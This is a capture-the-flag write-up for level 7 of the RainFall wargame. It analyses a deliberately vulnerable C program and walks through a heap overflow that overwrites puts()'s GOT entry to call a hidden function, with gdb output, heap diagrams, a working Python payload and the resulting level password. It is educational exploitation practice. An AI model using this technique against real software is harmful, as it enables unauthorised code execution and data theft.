# Level 7

<h3>source.c</h3>

```console
char c[68];

void m(void) {
  printf("%s - %d\n", c, time(0));
}

int main(int argc, char** argv) {
  int* l_var1;
  int* l_var2;

  l_var1 = malloc(8);
  l_var1[0] = 1;
  l_var1[1] = malloc(8);

  l_var2 = malloc(8);
  l_var2[0] = 2;
  l_var2[1] = malloc(8);

  strcpy(l_var1[1], argv[1]);
  strcpy(l_var2[1], argv[2]);

  fgets(c, 68, fopen("/home/user/level8/.pass", "r"));

  puts("~~");

  return (0);
}
```

<h3>Analysis</h3>

In this program, we can see there is several `malloc()` and `strcpy()` which means we could exploit the heap buffer overflow like the previous level

At the later part of the `main()`, `fopen()` is reading the password file, which in turn get the content saved into the global variable `c` by `fgets()`

And `m()` will prints out the content of the global variable `c`, but it never get called

Our target this time will be to redirect the `puts()` by modify its `GOT` value to the address of `m()` so it will be executed instead of the real `puts()`

We can achieved this by first over writing te value of `l_var2[1]` with the help of 1st `strcpy()` so that `l_var2[1]` will contain the address of the `GOT` from `puts()`

Next the 2nd `strcpy()` will write the address of `m()` into the `GOT` of `puts()`

<h3>Exploit</h3>

First we need to get the address of `m()`

```console
(gdb) print m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
```

There we have the address of `m()` which is `0x080484f4`

Next, lets visualize the `heap` state after all those call to `malloc()`

```console

1st malloc call (l_var1 = malloc(8))

        +-----------+
        | l_var1    |                                                 -> 8 bytes reserve for l_var1,
+-------------------+                                                    and it could split to 2 area of 4 byte by saving 2 int type data
| M | B | 8 bytes   |
+-------------------+
        | [0] | [1] |
        +-----------+

2nd malloc call (l_var1[1] = malloc(8))

        +-----------+   +-----------+
        |  l_var1   |   | l_var1[1] |                                 -> 8 bytes reserve for l_var1[1],
+-----------------------------------+                                     now l_var1[1] contains the address that point to those area
| M | B | 8 bytes   | B |  8 bytes  |                
+-----------------------------------+
        | [0] | [1] |___/
        +-----------+

3rd malloc call (l_var2 = malloc(8))

        +-----------+   +-----------+   +-----------+
        |  l_var1   |   | l_var1[1] |   |  l_var2   |                 -> 8 bytes reserve for l_var2,
+---------------------------------------------------+                    it could split to 2 area of 4 byte by saving 2 int type data
| M | B | 8 bytes   | B |  8 bytes  | B |  8 bytes  |
+---------------------------------------------------+
        | [0] | [1] |___/               | [0] | [1] |
        +-----------+                   +-----------+

4th malloc call (l_var2[1] = malloc(8))

        +-----------+   +-----------+   +-----------+   +----------+
        |  l_var1   |   | l_var1[1] |   |  l_var2   |   | l_var2[1]|  -> 8 bytes reserve for l_var2[1],
+------------------------------------------------------------------+     now l_var2[1] contains the address that point to those area
| M | B | 8 bytes   | B |  8 bytes  | B | 8 bytes   | B |  8 bytes |
+------------------------------------------------------------------+
        | [0] | [1] |__/                | [0] | [1] |__/
        +-----------+                   +-----------+


Offset needed to overwrite l_var1[1]

        +-----------+   +-----------+   +-----------+   +----------+
        |  l_var1   |   | l_var1[1] |   |  l_var2   |   | l_var2[1]|
+------------------------------------------------------------------+
| M | B | 8 bytes   | B |  8 bytes  | B | 8 bytes   | B |  8 bytes |
+------------------------------------------------------------------+
        | [0] | [1] |__/|           |   | [0] | [1] |__/
        +-----------+   |           |   +-----------+
                        | 8 bytes   | 8 |  4  |                       -> Combine size of l_var[1] (8 bytes) + l_var2 block metadata (8 bytes)
                        +-----------+---+-----+                          + l_var2[0] size of int (4 bytes), we get the total of 20 bytes

```

Now we have the offset to overwrite the address saved in side `l_var2[1]`, lets find the `GOT` address of `puts()`

```console
(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:	push   0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

There we have it, `0x08049928`

First we need to overwrite the address saved in side `l_var2[1]` with the following

`python -c "print 'a' * 20 + '\x28\x99\x04\x08'"`

Next to overwrite the content of `GOT` with the following

`python -c "print '\xf4\x84\x04\x08'"`

Now is the time to combine everything together

```console
level7@RainFall:~$ ./level7 `python -c "print 'a' * 20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"
`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1636248706
```